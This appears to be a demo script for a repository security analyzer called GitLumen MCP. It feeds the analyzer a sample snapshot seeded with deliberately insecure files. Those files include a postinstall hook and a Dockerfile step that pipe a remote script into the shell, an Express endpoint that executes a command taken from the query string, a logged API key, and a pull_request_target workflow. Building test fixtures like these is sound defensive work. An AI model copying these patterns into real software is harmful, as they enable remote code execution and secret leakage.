#!/usr/bin/env node
import { analyzeSnapshot } from './services/analyzer.js';
import { ReportStore } from './services/reportStore.js';

const snapshot = {
  mode: 'repository',
  owner: 'demo',
  repo: 'gitlumen-sample',
  repoUrl: 'https://github.com/demo/gitlumen-sample',
  ref: 'main',
  defaultBranch: 'main',
  description: 'Offline sample snapshot for GitLumen MCP.',
  stars: 0,
  forks: 0,
  language: 'TypeScript',
  isPrivate: false,
  tree: [
    { path: 'package.json', type: 'blob', size: 300 },
    { path: 'src/server.ts', type: 'blob', size: 1200 },
    { path: 'Dockerfile', type: 'blob', size: 200 },
    { path: '.github/workflows/ci.yml', type: 'blob', size: 200 },
    { path: 'README.md', type: 'blob', size: 100 }
  ],
  files: [
    {
      path: 'package.json',
      size: 300,
      status: 'unchanged',
      truncated: false,
      content: JSON.stringify({
        name: 'gitlumen-sample',
        version: '0.0.1',
        scripts: { postinstall: 'curl https://example.com/install.sh | sh' },
        dependencies: { express: '^4.18.0' }
      }, null, 2)
    },
    {
      path: 'src/server.ts',
      size: 1200,
      status: 'unchanged',
      truncated: false,
      content: `import express from 'express';\nimport child_process from 'child_process';\nconst app = express();\napp.get('/run', (req, res) => { child_process.exec(String(req.query.cmd)); res.send('ok'); });\nconsole.log(process.env.API_KEY);\n`
    },
    {
      path: 'Dockerfile',
      size: 200,
      status: 'unchanged',
      truncated: false,
      content: `FROM node:20\nRUN curl https://example.com/install.sh | bash\nCMD ["node", "server.js"]\n`
    },
    {
      path: '.github/workflows/ci.yml',
      size: 200,
      status: 'unchanged',
      truncated: false,
      content: `name: CI\non: pull_request_target\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n`
    },
    {
      path: 'README.md',
      size: 100,
      status: 'unchanged',
      truncated: false,
      content: '# GitLumen Sample\n'
    }
  ],
  limits: {
    treeEntriesReturned: 5,
    treeTruncated: false,
    filesDownloaded: 5,
    scope: 'quick'
  }
};

const report = analyzeSnapshot(snapshot, { scope: 'quick' });
const store = new ReportStore();
await store.save(report);
console.log(report.markdown);
console.error(`\nSaved sample report: ${report.reportId}`);
